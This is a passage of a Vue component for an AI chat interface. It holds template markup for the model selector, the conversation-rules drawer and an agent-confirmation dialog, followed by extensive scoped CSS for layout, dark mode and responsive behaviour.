                  <button
                    v-for="m in modelList" :key="m.id" type="button"
                    class="aimp-row" :class="{ on: String(selectedModelId) === String(m.id) }"
                    @click="pickModel(String(m.id))">
                    <span class="aimp-ico"><ProviderLogo :provider="m.provider" :size="18" /></span>
                    <span class="aimp-main">
                      <span class="aimp-name">{{ m.name }}</span>
                      <span class="aimp-sub">{{ m.model }}<template v-if="m.isDefault"> · 默认</template></span>
                    </span>
                    <el-icon v-if="String(selectedModelId) === String(m.id)" class="aimp-check"><Select /></el-icon>
                  </button>
                </div>
              </el-popover>
              <el-tooltip v-else content="管理员尚未配置可用模型，AI 暂不可用" placement="top" :show-after="200">
                <span class="ai-model-tag is-empty"><span class="ai-dot"></span>未配置模型</span>
              </el-tooltip>
              </div>
              <button v-if="!loading" type="button" class="ai-send" @click="send()">
                <el-icon><Promotion /></el-icon>
                <span>发送</span>
              </button>
              <button v-else type="button" class="ai-send stop" title="停止生成" @click="stopAi">
                <el-icon><VideoPause /></el-icon>
                <span>停止</span>
              </button>
            </div>
          </div>
        </div>
        <div class="ai-foot-disclaimer">内容由 AI 生成，请甄别参考</div>
      </div>
    </div>

    <!-- 对话条例 -->
    <el-drawer v-model="showInstructionsDrawer" title="对话条例" size="360px">
      <div class="ai-form">
        <el-form label-position="top">
          <el-form-item label="会话标题"><el-input v-model="instructionsForm.title" /></el-form-item>
          <el-form-item label="本次对话条例 / 系统提示">
            <el-input v-model="instructionsForm.instructions" type="textarea" :rows="8"
              placeholder="例如：请用简短 bullet 回答；优先引用官方文档；只讨论 Java 相关话题……" />
          </el-form-item>
        </el-form>
        <div class="ai-form-actions">
          <el-button @click="showInstructionsDrawer = false">取消</el-button>
          <el-button type="primary" :loading="savingInstructions" @click="submitInstructions">保存</el-button>
        </div>
      </div>
    </el-drawer>

    <!-- Agent 询问用户：给选项点选，也可以自己输入 -->
    <div v-if="agentAsk" class="ai-ask-mask" @click.self="answerAgentAsk('')">
      <div class="ai-ask-box">
        <div class="ai-ask-title">Agent 想跟你确认</div>
        <p class="ai-ask-q">{{ agentAsk.question }}</p>
        <div v-if="agentAsk.options.length" class="ai-ask-opts">
          <button
            v-for="(o, i) in agentAsk.options" :key="i"
            class="ai-ask-opt" @click="answerAgentAsk(o)"
          >{{ o }}</button>
        </div>
        <div class="ai-ask-custom">
          <input
            v-model="agentAskInput" class="ai-ask-i"
            placeholder="也可以自己输入…" @keyup.enter="answerAgentAsk()"
          />
          <button class="ai-ask-send" @click="answerAgentAsk()">确定</button>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.ai-layout { display: flex; height: 100%; min-height: 0; }

/* ===== 侧栏（可收起） ===== */
.ai-sidebar {
  width: 272px; flex-shrink: 0; border-right: 1px solid #eef0f4;
  background: #fbfbfd; overflow: hidden;
  transition: width .24s cubic-bezier(.4,0,.2,1), border-color .24s;
}
.ai-sidebar.collapsed { width: 0; border-right-color: transparent; }
html.dark .ai-sidebar { background: #131329; border-right-color: #26264a; }
.ai-sidebar-inner {
  width: 272px; height: 100%; display: flex; flex-direction: column;
  transition: opacity .16s ease;
}
.ai-sidebar.collapsed .ai-sidebar-inner { opacity: 0; }

.ai-sidebar-head { padding: 14px 12px 10px; }
.ai-newchat {
  display: flex; align-items: center; justify-content: center; gap: 6px;
  width: 100%; height: 38px; border-radius: 10px; border: 1px solid #e2e8f0;
  background: #fff; color: #1e293b; font-size: 14px; font-weight: 500; cursor: pointer;
  transition: background .15s, border-color .15s, color .15s;
}
.ai-newchat:hover:not(:disabled) { background: #eef2ff; border-color: #c7d2fe; color: #4f46e5; }
.ai-newchat:disabled { opacity: .6; cursor: default; }
html.dark .ai-newchat { background: #1b1b35; border-color: #2b2c4d; color: #e7e7ee; }
html.dark .ai-newchat:hover:not(:disabled) { background: #26264f; border-color: #4f46e5; color: #a5b4fc; }

.ai-conv-head {
  padding: 6px 18px 4px; font-size: 12px; color: #94a3b8; letter-spacing: .04em;
  display: flex; align-items: center; justify-content: space-between; gap: 8px;
}
.conv-head-acts { display: flex; align-items: center; gap: 4px; }
.conv-mini {
  border: none; background: transparent; cursor: pointer;
  font-size: 12px; color: #6366f1; padding: 2px 6px; border-radius: 6px;
  letter-spacing: 0; transition: background .15s, color .15s;
}
.conv-mini:hover:not(:disabled) { background: #eef2ff; }
.conv-mini:disabled { color: #cbd5e1; cursor: not-allowed; }
.conv-mini.danger { color: #ef4444; }
.conv-mini.danger:hover:not(:disabled) { background: #fef2f2; }
.ai-conv-check { font-size: 16px; color: #cbd5e1; flex: none; }
.ai-conv-check.on { color: #6366f1; }
.ai-conv-item.selected { background: #eef2ff; }
.ai-conv-list { flex: 1; overflow: auto; padding: 4px 10px 10px; position: relative; }
.ai-conv-inner { position: relative; }
.ai-conv-empty { padding: 24px 12px; text-align: center; color: #94a3b8; font-size: 13px; line-height: 1.8; }
.ai-conv-item {
  display: flex; align-items: center; gap: 10px; padding: 10px;
  border-radius: 10px; cursor: pointer; transition: background .15s; margin-bottom: 2px;
}
.ai-conv-item:hover { background: #eef2ff; }
.ai-conv-item.active { background: #e7ebff; box-shadow: inset 3px 0 0 #6366f1; }
html.dark .ai-conv-item:hover { background: #1e1e3d; }
html.dark .ai-conv-item.active { background: #26264f; }
.ai-conv-icon { color: #6366f1; flex-shrink: 0; }
.ai-conv-main { flex: 1; min-width: 0; }
.ai-conv-title { font-size: 14px; color: #0f172a; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
html.dark .ai-conv-title { color: #e7e7ee; }
.ai-conv-meta { font-size: 12px; color: #94a3b8; margin-top: 2px; }
.ai-conv-actions { display: none; gap: 2px; }
.ai-conv-item:hover .ai-conv-actions { display: flex; }
.ai-conv-actions :deep(.el-button) { padding: 4px; height: auto; }

/* ===== 主区 ===== */
.ai-page { display: flex; flex-direction: column; height: 100%; min-height: 0; flex: 1; background: #fff; }
html.dark .ai-page { background: #16162e; }

.ai-head { display: flex; align-items: center; justify-content: space-between; padding: 14px 24px; border-bottom: 1px solid #eef0f4; }
html.dark .ai-head { border-bottom-color: #26264a; }
.ai-head-left { display: flex; align-items: center; gap: 12px; min-width: 0; }
.ai-head-info { min-width: 0; }
.ai-side-toggle {
  display: inline-flex; align-items: center; justify-content: center;
  width: 34px; height: 34px; border-radius: 9px; border: 1px solid #e2e8f0;
  background: #fff; color: #475569; cursor: pointer; flex-shrink: 0;
  transition: color .15s, background .15s, border-color .15s;
}
.ai-side-toggle:hover { color: #4f46e5; background: #eef2ff; border-color: #c7d2fe; }
html.dark .ai-side-toggle { background: #1b1b35; border-color: #2b2c4d; color: #b7b8cd; }
html.dark .ai-side-toggle:hover { background: #26264f; border-color: #4f46e5; color: #a5b4fc; }
.ai-head-left .ai-title { font-size: 17px; font-weight: 700; color: #0f172a; }
html.dark .ai-head-left .ai-title { color: #e7e7ee; }
.ai-head-left .ai-sub { font-size: 13px; color: #94a3b8; margin-top: 3px; }
.ai-model-tag {
  display: inline-flex; align-items: center; gap: 6px;
  font-size: 12px; color: #6366f1; background: #eef2ff;
  border: 1px solid #e0e7ff; padding: 4px 10px; border-radius: 999px;
}
.ai-dot { width: 6px; height: 6px; border-radius: 50%; background: #6366f1; box-shadow: 0 0 0 3px rgba(99,102,241,.18); }
html.dark .ai-model-tag { background: #26264f; border-color: #3a3a63; }
.ai-model-tag.is-empty { color: #94a3b8; background: #f1f5f9; border-color: #e2e8f0; }
html.dark .ai-model-tag.is-empty { color: #8b8ca4; background: #1b1b35; border-color: #2b2c4d; }

/* 模型选择下拉 */
/* 模型选择器（WorkBuddy 风格触发器，2026-10-18） */
.aimp-trigger {
  display: inline-flex; align-items: center; gap: 7px; height: 30px; max-width: 220px;
  padding: 0 10px 0 9px; border-radius: 999px; cursor: pointer;
  background: #eef2ff; border: 1px solid #e0e7ff; color: #4f46e5;
  font-size: 12.5px; font-family: inherit; transition: background .15s, border-color .15s;
}
.aimp-trigger:hover { background: #e8edff; border-color: #c7d2fe; }
.aimp-label { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.aimp-caret { font-size: 12px; opacity: .72; flex: none; }
.aimp-dot { width: 9px; height: 9px; border-radius: 50%; background: #a5b4fc; flex: none; }
html.dark .aimp-trigger { background: #26264f; border-color: #3a3a63; color: #a5b4fc; }
html.dark .aimp-trigger:hover { background: #2e2e5c; border-color: #4a4a7a; }

/* 调用元信息（模型 / 耗时 / token） */
.ai-meta { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin-top: 2px; }
/* 思考过程折叠块 */
.ai-reasoning {
  margin: 2px 0 4px;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  background: #f8fafc;
  font-size: 12px;
  overflow: hidden;
}
.ai-reasoning summary {
  cursor: pointer;
  padding: 5px 10px;
  color: #64748b;
  user-select: none;
  font-weight: 600;
}
.ai-reasoning summary:hover { color: #475569; }
.ai-reasoning-body {
  padding: 0 10px 8px;
  color: #94a3b8;
  line-height: 1.7;
  white-space: pre-wrap;
  word-break: break-word;
  max-height: 260px;
  overflow-y: auto;
}
html.dark .ai-reasoning { background: #1b1b35; border-color: #2b2c4d; }
html.dark .ai-reasoning summary { color: #8b8ca4; }
html.dark .ai-reasoning-body { color: #6d6f88; }
.ai-meta-chip {
  display: inline-flex; align-items: center; gap: 4px;
  font-size: 11.5px; color: #64748b; background: #f8fafc;
  border: 1px solid #eef0f4; padding: 2px 8px; border-radius: 999px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
}
.ai-meta-chip .el-icon { font-size: 12px; color: #6366f1; }
html.dark .ai-meta-chip { background: #1b1b35; border-color: #2b2c4d; color: #8b8ca4; }
html.dark .ai-meta-chip .el-icon { color: #8b8ca4; }

/* 消息区 */
.ai-body { position: relative; flex: 1; min-height: 0; overflow: auto; padding: 24px 0 12px; }
.ai-body::-webkit-scrollbar { width: 8px; }
.ai-body::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 4px; }
html.dark .ai-body::-webkit-scrollbar-thumb { background: #2b2c4d; }

/* 空状态 */
.ai-empty { margin: 36px auto 0; text-align: center; color: #94a3b8; max-width: 600px; padding: 0 24px; }
.ai-orb {
  width: 72px; height: 72px; border-radius: 22px; margin: 0 auto 20px;
  background: linear-gradient(135deg,#6366f1 0%, #4f46e5 60%, #7c3aed 100%);
  display: flex; align-items: center; justify-content: center;
  box-shadow: 0 14px 36px rgba(79,70,229,.32), inset 0 0 0 1px rgba(255,255,255,.18);
  position: relative;
}
.ai-orb::after {
  content: ''; position: absolute; inset: -6px; border-radius: 26px;
  background: linear-gradient(135deg, rgba(99,102,241,.25), rgba(124,58,237,.18));
  filter: blur(14px); z-index: -1;
}
.ai-orb-mark { width: 38px; height: 38px; }
.ai-empty-title { font-size: 24px; font-weight: 700; color: #1e293b; margin: 0 0 8px; }
html.dark .ai-empty-title { color: #e2e8f0; }
.ai-empty-tip { font-size: 14px; margin: 0 0 18px; color: #64748b; }
html.dark .ai-empty-tip { color: #94a3b8; }
.ai-features { display: flex; gap: 8px; justify-content: center; margin-bottom: 22px; flex-wrap: wrap; }
.ai-feature {
  display: inline-flex; align-items: center; gap: 5px;
  font-size: 12.5px; color: #475569; background: #f1f5f9;
  padding: 5px 12px; border-radius: 999px; border: 1px solid #e2e8f0;
}
.ai-feature .el-icon { color: #6366f1; font-size: 13px; }
html.dark .ai-feature { background: #1b1b35; border-color: #2b2c4d; color: #b7b8cd; }

.ai-sugs { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
.ai-sug {
  border: 1px solid #eef0f4; background: #fff; color: #475569;
  padding: 10px 16px; border-radius: 14px; font-size: 13.5px; cursor: pointer;
  transition: background-color .15s, color .15s, border-color .15s, transform .1s;
}
.ai-sug:hover { background: #eef2ff; color: #4f46e5; border-color: #c7d2fe; transform: translateY(-1px); }
html.dark .ai-sug { background: #1b1b35; border-color: #2b2c4d; color: #b7b8cd; }
html.dark .ai-sug:hover { background: #26264f; color: #a5b4fc; border-color: #4f46e5; }
.ai-disclaimer { margin: 22px 0 0; font-size: 12px; color: #cbd5e1; }
html.dark .ai-disclaimer { color: #5b5c74; }

/* 消息流 */
.ai-msgs { display: flex; flex-direction: column; gap: 22px; max-width: 780px; margin: 0 auto; padding: 0 24px; }
.ai-msg { display: flex; gap: 10px; align-items: flex-start; }
/* 用户行：align-self 把整行推到阅读列右端；DOM [bubble, avatar] 让头像自然在消息右侧 */
.ai-msg.user { align-self: flex-end; max-width: 90%; }
.ai-msg.user .user-bubble { border-bottom-right-radius: 5px; }
/* AI 行：占满，col 自适应 */
.ai-msg.ai { align-self: stretch; }
.ai-msg.ai .ai-col { flex: 1; min-width: 0; }

/* 头像 */
.ai-avatar {
  width: 32px; height: 32px; border-radius: 50%; flex-shrink: 0;
  display: flex; align-items: center; justify-content: center;
  font-size: 13px; font-weight: 700; color: #fff; overflow: hidden;
}
.ai-avatar img { width: 100%; height: 100%; object-fit: cover; display: block; }
.ai-av { background: linear-gradient(135deg,#6366f1,#4f46e5 60%,#7c3aed); border-radius: 10px; }
.ai-av-mark { width: 16px; height: 16px; }
.user-av { /* 背景由 :style 注入（基于用户名 hash 的渐变），区分每个用户 */ }

/* 用户气泡 */
.user-bubble {
  padding: 10px 16px; border-radius: 16px; border-top-right-radius: 5px;
  font-size: 14.5px; line-height: 1.7; word-break: break-word;
  background: #eef2ff; color: #1e293b; max-width: 560px;
}
html.dark .user-bubble { background: #26264f; color: #e2e8f0; }

/* AI 名称行 + 内容 */
.ai-col { display: flex; flex-direction: column; gap: 6px; }
.ai-name-row { display: flex; align-items: center; gap: 8px; padding-top: 4px; }
.ai-name { font-size: 13px; font-weight: 600; color: #475569; }
html.dark .ai-name { color: #b7b8cd; }
.ai-mode-chip {
  font-size: 11px; color: #a5b4fc; background: #eef2ff; border: 1px solid #e0e7ff;
  padding: 1px 8px; border-radius: 999px;
}
html.dark .ai-mode-chip { background: #26264f; border-color: #3a3a63; }

.ai-flat { font-size: 14.5px; line-height: 1.8; color: #0f172a; word-break: break-word; overflow-wrap: anywhere; }
html.dark .ai-flat { color: #e7e7ee; }
.ai-flat :deep(p) { margin: 0 0 10px; }
.ai-flat :deep(p:last-child) { margin-bottom: 0; }
.ai-flat :deep(h2), .ai-flat :deep(h3), .ai-flat :deep(h4) { margin: 14px 0 8px; font-weight: 600; color: inherit; }
.ai-flat :deep(ul) { margin: 6px 0 10px; padding-left: 20px; }
.ai-flat :deep(li) { margin: 3px 0; }
.ai-flat :deep(strong) { font-weight: 700; }
.ai-flat :deep(a) { color: #4f46e5; text-decoration: none; border-bottom: 1px solid #c7d2fe; }
.ai-flat :deep(a:hover) { border-bottom-color: #6366f1; }
.ai-flat :deep(blockquote) { margin: 8px 0; padding: 6px 12px; border-left: 3px solid #c7d2fe; color: #475569; background: #f8fafc; border-radius: 0 8px 8px 0; }
html.dark .ai-flat :deep(blockquote) { border-left-color: #4f46e5; color: #b7b8cd; background: #181830; }
.ai-flat :deep(.md-inline) { background: #eef2ff; color: #4f46e5; padding: 1px 6px; border-radius: 5px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12.5px; }
html.dark .ai-flat :deep(.md-inline) { background: #26264f; color: #a5b4fc; }
.ai-flat :deep(.md-code-block) { position: relative; margin: 10px 0; }
.ai-flat :deep(.md-code) { background: #0f172a; color: #e2e8f0; padding: 14px 16px; border-radius: 10px; overflow: auto; font-size: 12.5px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; line-height: 1.6; }
.ai-flat :deep(.md-code code) { white-space: pre; }
html.dark .ai-flat :deep(.md-code) { background: #0b0b1a; }
.ai-flat :deep(.md-copy-btn) {
  position: absolute; top: 8px; right: 8px; border: none;
  background: rgba(255,255,255,.12); color: #cbd5e1; font-size: 12px;
  padding: 3px 9px; border-radius: 6px; cursor: pointer; transition: background .15s;
}
.ai-flat :deep(.md-copy-btn:hover) { background: rgba(255,255,255,.22); }

/* Prism 语法高亮 token 配色：代码块始终深色底，故亮色 token 在明暗两套主题都适用 */
.ai-flat :deep(.md-code .token.comment),
.ai-flat :deep(.md-code .token.prolog),
.ai-flat :deep(.md-code .token.doctype),
.ai-flat :deep(.md-code .token.cdata) { color: #7c8495; font-style: italic; }
.ai-flat :deep(.md-code .token.punctuation) { color: #9aa4b2; }
.ai-flat :deep(.md-code .token.keyword),
.ai-flat :deep(.md-code .token.boolean),
.ai-flat :deep(.md-code .token.operator),
.ai-flat :deep(.md-code .token.tag) { color: #c792ea; }
.ai-flat :deep(.md-code .token.string),
.ai-flat :deep(.md-code .token.char),
.ai-flat :deep(.md-code .token.attr-value) { color: #a5e075; }
.ai-flat :deep(.md-code .token.number),
.ai-flat :deep(.md-code .token.constant),
.ai-flat :deep(.md-code .token.symbol) { color: #f7b955; }
.ai-flat :deep(.md-code .token.function),
.ai-flat :deep(.md-code .token.class-name) { color: #82aaff; }
.ai-flat :deep(.md-code .token.property),
.ai-flat :deep(.md-code .token.attr-name) { color: #ffcb6b; }

/* 引用来源 */
.ai-sources { margin-top: 4px; border-top: 1px solid #eef0f4; padding-top: 10px; }
html.dark .ai-sources { border-top-color: #2b2c4d; }
/* 检索未命中提示：低调、不抢答内容的视觉重心 */
.ai-no-source {
  display: flex; align-items: center; gap: 6px;
  margin-top: 8px; font-size: 12px; color: #94a3b8;
}
.ai-no-source .el-icon { color: #cbd5e1; }
html.dark .ai-no-source { color: #6d6f88; }
html.dark .ai-no-source .el-icon { color: #4a4b6a; }
.ai-sources-head { display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 8px; }
html.dark .ai-sources-head { color: #b7b8cd; }
.ai-sources-head .el-icon { color: #6366f1; }
.ai-source-list { display: flex; flex-direction: column; gap: 6px; }
.ai-source {
  text-align: left; border: 1px solid #e2e8f0; background: #fff; border-radius: 10px;
  padding: 8px 10px; cursor: pointer; display: flex; flex-direction: column; gap: 2px;
  transition: border-color .15s, background .15s;
}
.ai-source:hover { border-color: #c7d2fe; background: #eef2ff; }
html.dark .ai-source { background: #1b1b35; border-color: #2b2c4d; }
html.dark .ai-source:hover { background: #26264f; border-color: #4f46e5; }
.ai-source-title { font-size: 13px; font-weight: 600; color: #1e293b; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
html.dark .ai-source-title { color: #e2e8f0; }
.ai-source-snippet {
  font-size: 12px; color: #94a3b8; line-height: 1.5;
  display: -webkit-box; -webkit-line-clamp: 2; line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
}

/* 每条 AI 操作行 */
.ai-actions { display: flex; align-items: center; gap: 6px; padding-left: 2px; padding-top: 2px; }
.ai-icon-btn {
  display: inline-flex; align-items: center; justify-content: center;
  width: 28px; height: 28px; border-radius: 8px; border: none;
  background: transparent; color: #94a3b8; font-size: 15px; cursor: pointer;
  transition: color .15s, background .15s;
}
.ai-icon-btn:hover:not(:disabled) { color: #4f46e5; background: #eef2ff; }
.ai-icon-btn:disabled { opacity: .45; cursor: default; }
html.dark .ai-icon-btn:hover:not(:disabled) { background: #26264f; }

/* 新消息浮入（仅最后一条，切换历史时不抖动） */
.ai-msgs > .ai-msg:last-child { animation: ai-msg-in .28s cubic-bezier(.2,.8,.2,1) both; }
@keyframes ai-msg-in { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }

/* 思考中三点 */
.ai-typing { display: inline-flex; gap: 5px; align-items: center; min-height: 24px; padding: 4px 2px; }
.ai-agent-steps { margin-top: 6px; }
.ai-agent-head {
  display: inline-flex; align-items: center; gap: 8px; cursor: pointer;
  font-size: 12.5px; color: var(--el-text-color-secondary); user-select: none;
}
.ai-agent-head:hover { color: var(--el-color-primary); }
.ai-agent-toggle { font-size: 12px; color: var(--el-color-primary); }
.ai-agent-list { margin-top: 6px; display: flex; flex-direction: column; gap: 5px; }
.ai-agent-step {
  display: flex; align-items: flex-start; gap: 7px;
  font-size: 12.5px; color: var(--el-text-color-secondary); line-height: 1.55;
}
.ai-agent-dot { flex: none; width: 5px; height: 5px; border-radius: 50%; background: var(--el-color-primary); margin-top: 7px; }

/* Agent 询问弹层 */
.ai-ask-mask {
  position: fixed; inset: 0; z-index: 3000; background: rgba(0, 0, 0, .42);
  display: flex; align-items: center; justify-content: center; padding: 20px;
}
.ai-ask-box {
  width: 100%; max-width: 460px; background: var(--el-bg-color);
  border-radius: 14px; padding: 20px 22px; box-shadow: 0 12px 40px rgba(0, 0, 0, .18);
}
.ai-ask-title { font-size: 15px; font-weight: 700; color: var(--el-text-color-primary); margin-bottom: 10px; }
.ai-ask-q { margin: 0 0 16px; font-size: 14px; line-height: 1.7; color: var(--el-text-color-regular); }
.ai-ask-opts { display: flex; flex-direction: column; gap: 8px; margin-bottom: 14px; }
.ai-ask-opt {
  text-align: left; border: 1px solid var(--el-border-color); background: var(--el-bg-color);
  color: var(--el-text-color-regular); font-size: 13.5px; padding: 11px 14px;
  border-radius: 10px; cursor: pointer; transition: all .16s;
}
.ai-ask-opt:hover { border-color: var(--el-color-primary); color: var(--el-color-primary); background: var(--el-color-primary-light-9); }
.ai-ask-custom { display: flex; gap: 8px; }
.ai-ask-i {
  flex: 1 1 auto; border: 1px solid var(--el-border-color); border-radius: 10px;
  background: var(--el-bg-color); color: var(--el-text-color-primary);
  font-size: 14px; padding: 10px 12px; outline: none;
}
.ai-ask-i:focus { border-color: var(--el-color-primary); }
.ai-ask-send {
  flex: none; border: none; border-radius: 10px; background: var(--el-color-primary);
  color: #fff; font-size: 14px; padding: 0 20px; cursor: pointer;
}
.ai-typing span { width: 7px; height: 7px; border-radius: 50%; background: #c7d2fe; animation: ai-blink 1.2s infinite both; }
html.dark .ai-typing span { background: #6366f1; }
.ai-typing span:nth-child(2) { animation-delay: .2s; }
.ai-typing span:nth-child(3) { animation-delay: .4s; }
@keyframes ai-blink { 0%,80%,100% { opacity: .3 } 40% { opacity: 1 } }

/* 回到底部按钮 */
.ai-tobottom {
  position: absolute; left: 50%; transform: translateX(-50%); bottom: 12px;
  width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e2e8f0;
  background: #fff; color: #6366f1; display: flex; align-items: center; justify-content: center;
  cursor: pointer; box-shadow: 0 8px 22px rgba(15,23,42,.14);
}
html.dark .ai-tobottom { background: #1b1b35; border-color: #2b2c4d; }
.fade-enter-active, .fade-leave-active { transition: opacity .15s; }
.fade-enter-from, .fade-leave-to { opacity: 0; }

/* 输入栏 */
.ai-input-wrap { padding: 12px 24px 14px; border-top: 1px solid #eef0f4; display: flex; flex-direction: column; align-items: center; gap: 6px; background: #fff; }
html.dark .ai-input-wrap { background: #16162e; border-top-color: #26264a; }
.ai-input-card {
  width: 100%; max-width: 780px; border: 1px solid #e2e8f0; border-radius: 20px;
  background: #fff; padding: 12px 14px 10px; box-shadow: 0 6px 22px rgba(15,23,42,.06);
  transition: border-color .15s, box-shadow .15s;
}
.ai-input-card:focus-within { border-color: #6366f1; box-shadow: 0 6px 26px rgba(79,70,229,.16); }
html.dark .ai-input-card { background: #1b1b35; border-color: #2b2c4d; }
.ai-text { flex: 1; width: 100%; resize: none; border: none; outline: none; font-size: 14.5px; font-family: inherit; color: #0f172a; background: transparent; line-height: 1.6; }
html.dark .ai-text { color: #e7e7ee; }
.ai-input-bar { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; margin-top: 8px; }

/* ---------- 附件（上传的本地解析内容） ---------- */
.ai-atts { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 8px; }
.ai-att {
  display: inline-flex; align-items: center; gap: 4px;
  max-width: 240px; padding: 3px 6px 3px 9px;
  border-radius: 9px; background: #eef2ff; color: #4338ca;
  font-size: 12px; line-height: 1.5;
}
html.dark .ai-att { background: #23244a; color: #a5b4fc; }
.ai-att-x {
  border: none; background: transparent; cursor: pointer;
  color: inherit; opacity: .65; font-size: 14px; line-height: 1; padding: 0 2px;
}
.ai-att-x:hover { opacity: 1; }
.ai-att-mode {
  border: none; cursor: pointer; padding: 1px 6px; border-radius: 6px;
  background: rgba(99,102,241,.14); color: #4338ca; font-size: 11px; line-height: 1.4;
}
.ai-att-mode:hover { background: rgba(99,102,241,.24); }
html.dark .ai-att-mode { background: rgba(129,140,248,.22); color: #c7d2fe; }
.ai-files { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 6px; }
.ai-file-chip {
  display: inline-block; padding: 2px 8px; border-radius: 7px;
  background: rgba(255,255,255,.22); font-size: 12px; line-height: 1.5;
}

/* 模式切换（滑动指示器） */
.ai-mode { position: relative; display: inline-flex; flex: none; background: #f1f5f9; border-radius: 10px; padding: 3px; }
html.dark .ai-mode { background: #14142a; }
.ai-mode-thumb {
  position: absolute; top: 3px; left: 3px; width: calc((100% - 6px) / 3); height: calc(100% - 6px);
  background: #fff; border-radius: 8px; box-shadow: 0 1px 3px rgba(15,23,42,.12);
  transition: transform .22s cubic-bezier(.4,0,.2,1);
}
html.dark .ai-mode-thumb { background: #2b2c4d; }
.ai-mode-btn {
  position: relative; z-index: 1; flex: 1; display: inline-flex; align-items: center; justify-content: center; gap: 5px;
  border: none; background: transparent; color: #64748b; font-size: 13px; padding: 6px 12px; border-radius: 8px;
  cursor: pointer; transition: color .18s; white-space: nowrap;
}
.ai-mode-btn .el-icon { font-size: 14px; }
.ai-mode-btn.active { color: #4f46e5; font-weight: 600; }
html.dark .ai-mode-btn.active { color: #a5b4fc; }

.ai-input-right { display: flex; align-items: center; gap: 8px; }

/* 上下文环 + 模型选择：2026-10-20 从标题栏移到输入栏（对齐 WorkBuddy 的输入框布局） */
.ai-input-tools { display: flex; align-items: center; gap: 2px; }
.ai-input-tools .ai-ctx { margin-right: 0; }
.ai-input-tools .aimp-trigger { height: 28px; max-width: 176px; }
.ai-round-btn {
  display: inline-flex; align-items: center; justify-content: center;
  width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e2e8f0;
  background: #fff; color: #64748b; cursor: pointer; transition: color .15s, background .15s, border-color .15s;
}
.ai-round-btn.ghost:hover { color: #6366f1; background: #eef2ff; border-color: #c7d2fe; }
.ai-round-btn .el-icon { font-size: 16px; }
html.dark .ai-round-btn { background: #1b1b35; border-color: #2b2c4d; color: #b7b8cd; }
html.dark .ai-round-btn.ghost:hover { background: #26264f; border-color: #4f46e5; color: #a5b4fc; }

.ai-send {
  display: inline-flex; align-items: center; gap: 5px; height: 36px; padding: 0 16px;
  border: none; border-radius: 10px; cursor: pointer;
  background: linear-gradient(135deg,#6366f1,#4f46e5); color: #fff; font-size: 13.5px; font-weight: 600;
  transition: filter .15s, transform .1s;
}
.ai-send:hover:not(:disabled) { filter: brightness(1.08); }
.ai-send:active:not(:disabled) { transform: translateY(1px); }
.ai-send:disabled { opacity: .65; cursor: default; }
.ai-send.stop { background: linear-gradient(135deg,#f87171,#dc2626); }
.ai-send-spinner {
  width: 14px; height: 14px; border-radius: 50%; border: 2px solid rgba(255,255,255,.4);
  border-top-color: #fff; animation: ai-spin .8s linear infinite;
}
@keyframes ai-spin { to { transform: rotate(360deg); } }

.ai-foot-disclaimer { font-size: 11.5px; color: #cbd5e1; text-align: center; }
html.dark .ai-foot-disclaimer { color: #5b5c74; }

/* 抽屉 */
.ai-form { padding: 8px 4px; }
.ai-form-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }

/* 会话列表动画（删除时柔顺，FLIP 补位） */
.conv-move { transition: transform .24s ease; }
.conv-leave-active { transition: opacity .2s ease, transform .2s ease; position: absolute; width: calc(100% - 20px); }
.conv-leave-to { opacity: 0; transform: translateX(-10px); }

/* ===================== 响应式布局（追加在末尾） ===================== */
@media (max-width: 1024px) {
  /* 历史会话侧栏：覆盖式抽屉，默认收起（不再盖住消息区），点遮罩/选中会话自动关 */
  .ai-layout { position: relative; overflow: hidden; }
  .ai-sidebar {
    position: absolute; top: 0; bottom: 0; left: 0; z-index: 30;
    width: 272px; max-width: 86vw;
    box-shadow: none;
  }
  .ai-sidebar.is-drawer {
    transform: translateX(-100%);
    transition: transform .26s cubic-bezier(.4, 0, .2, 1), box-shadow .26s;
  }
  .ai-sidebar.is-drawer.drawer-open {
    transform: translateX(0);
    box-shadow: 0 0 36px rgba(15, 23, 42, .22);
  }
  .ai-sidebar-inner { width: 100%; max-width: 86vw; opacity: 1; }
  /* 遮罩：盖住主区，点击收起抽屉 */
  .ai-side-mask {
    position: absolute; inset: 0; z-index: 25;
    background: rgba(15, 23, 42, .38);
    animation: ai-mask-in .18s ease both;
  }
  @keyframes ai-mask-in { from { opacity: 0 } to { opacity: 1 } }
  /* 触屏没有 hover，操作按钮常显 */
  .ai-conv-actions { display: flex; }

  .ai-head { padding: 12px 14px; }
  .ai-msgs { max-width: 100%; padding: 0 14px; }
  .ai-body { padding: 18px 0 12px; }
  .ai-empty { padding: 0 14px; margin-top: 24px; }
  .ai-input-wrap { padding: 10px 14px 12px; }
}

@media (max-width: 640px) {
  .ai-sidebar { width: 84vw; max-width: 300px; }
  .ai-sidebar-inner { width: 84vw; max-width: 300px; }

  .ai-head { padding: 10px 12px; gap: 10px; }
  .ai-head-left { gap: 8px; }
  .ai-head-left .ai-title { font-size: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .ai-head-left .ai-sub { font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .ai-model-tag { font-size: 11px; padding: 3px 8px; }
  .aimp-trigger { max-width: 150px; }

  .ai-msgs { gap: 16px; padding: 0 12px; }
  .ai-msg.user { max-width: 100%; }
  .user-bubble { max-width: 100%; font-size: 14px; padding: 9px 13px; }
  .ai-flat { font-size: 14px; }
  .ai-flat :deep(.md-code) { padding: 12px; font-size: 12px; }

